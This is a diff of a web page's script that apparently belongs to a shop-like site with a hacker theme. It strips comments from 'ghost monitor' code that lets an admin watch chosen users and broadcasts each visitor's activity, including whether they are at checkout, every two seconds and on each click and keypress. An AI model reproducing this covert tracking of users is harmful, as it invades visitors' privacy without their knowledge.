@@ -393,9 +393,6 @@ function targetUser(targetID) {
     if(document.getElementById('chat-widget').style.display !== 'flex') toggleChat(); 
 }
 
-// ==========================================
-// FIXED GHOST MONITOR LOGIC (DIRECT SYNC)
-// ==========================================
 function openGhostView(targetID) {
     const gW = window.open('', '_blank', 'width=450,height=500');
     gW.document.write(`
@@ -460,9 +457,6 @@ async function getIdentity() {
     } catch(e) { console.log("Identity Error"); }
 }
 
-// ==========================================
-// FIXED GHOST BROADCASTER (HEARTBEAT)
-// ==========================================
 function broadcastGhostData() {
     if(isAdmin || userID === "Unknown") return;
     const isCheckout = document.getElementById('checkout-page').style.display !== 'none';
@@ -732,10 +726,9 @@ window.onload = () => {
         if(e.key === "PageUp") { e.preventDefault(); document.getElementById('pgup-menu').style.display = 'block'; }
     });
 
-    // CRITICAL: UPDATED BROADCAST LISTENERS
     window.addEventListener('mousedown', () => broadcastGhostData());
     window.addEventListener('keyup', () => broadcastGhostData());
-    setInterval(broadcastGhostData, 2000); // AUTO-HEARTBEAT EVERY 2S
+    setInterval(broadcastGhostData, 2000);
 
     const logs = document.getElementById('load-logs'), lines = ["> BOOTING R4...", "> SYNCING DATABASE...", "> READY."];
     let step = 0;
@@ -771,4 +764,3 @@ function startAudio() { if(!musicStarted) { document.getElementById('hacker-musi
 </script>
 </body>
 </html>
-
